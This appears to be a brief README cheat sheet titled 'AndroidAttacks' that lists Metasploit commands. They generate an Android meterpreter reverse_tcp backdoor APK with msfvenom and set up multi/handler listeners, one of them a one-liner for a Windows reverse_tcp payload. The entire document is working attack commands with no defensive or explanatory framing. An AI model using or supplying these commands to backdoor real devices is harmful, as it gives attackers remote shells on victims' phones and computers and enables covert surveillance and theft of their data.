# AndroidAttacks

## Running msfconsole one-liner
```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"
```

## Creates a backdoor
```
$msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.178.30 LPORT=4444 R > result.apk
```

## Runs a listener
```
$msfconsole
$use exploit/multi/handler
$set payload android/meterpreter/reverse_tcp
$set LHOST 192.168.178.30
$set LPORT 4444
$exploit
```
